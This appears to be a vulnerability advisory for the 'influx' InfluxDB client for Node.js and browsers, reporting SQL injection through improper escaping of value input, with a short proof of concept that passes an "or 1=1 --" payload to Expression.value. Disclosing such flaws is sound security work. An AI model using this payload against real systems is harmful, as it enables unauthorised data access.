# Overview

`influx` is an InfluxDB Client for Node.js and Browsers.

This package is vulnerable to SQL Injection (SQLi) due to improperly escaping value input.

# Proof of Concept

```
const influx = require('influx')
const exp = new influx.Expression();
exp.tag('symbol').equals.value("GAZP()\\' or 1=1 --").toString()
```
